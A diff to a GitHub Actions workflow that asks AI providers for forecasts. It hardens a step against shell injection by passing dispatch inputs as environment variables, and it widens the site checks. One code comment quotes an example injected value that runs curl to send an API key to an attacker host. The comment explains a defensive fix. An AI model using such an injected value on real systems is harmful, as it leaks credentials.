@@ -66,6 +66,10 @@ jobs:
           MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY }}
         run: node tools/run-elicitation.mjs --check
 
+      # Dispatch inputs reach the shell as environment variables rather than
+      # expression interpolation: this step holds every provider API key, so a
+      # value like "; curl attacker/?k=$OPENAI_API_KEY" must never be able to
+      # become a command. The harness validates the values themselves.
       - name: Elicit forecasts
         if: ${{ !inputs.check_only && !inputs.list_models }}
         env:
@@ -77,10 +81,13 @@ jobs:
           DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
           MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
           MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY }}
-        run: >
-          node tools/run-elicitation.mjs
-          --samples ${{ inputs.samples || '20' }}
-          ${{ inputs.models && format('--models {0}', inputs.models) || '' }}
+          SAMPLES: ${{ inputs.samples || '20' }}
+          MODELS: ${{ inputs.models }}
+        run: |
+          set -euo pipefail
+          argv=(--samples "$SAMPLES")
+          if [ -n "${MODELS:-}" ]; then argv+=(--models "$MODELS"); fi
+          node tools/run-elicitation.mjs "${argv[@]}"
 
       # Elicitation costs real money, so persist the raw batches before any
       # later step can fail. The artifact is the recovery path if the push below
@@ -97,9 +104,16 @@ jobs:
         if: ${{ !inputs.check_only && !inputs.list_models }}
         run: node tools/import-runs.mjs
 
-      - name: Syntax-check generated data
+      # Syntax alone was checked before, and only on the generated file — a
+      # run could publish a valid-JS allocation that did not sum to 100, or an
+      # app.js that never parsed.
+      - name: Check the site
         if: ${{ !inputs.check_only && !inputs.list_models }}
-        run: node --check public/data.js
+        run: |
+          set -euo pipefail
+          node --check public/data.js
+          node --check public/app.js
+          node tools/check-site.mjs
 
       # Push a branch rather than using a create-PR action: pushing needs only
       # contents:write (granted above), while opening a PR from Actions needs
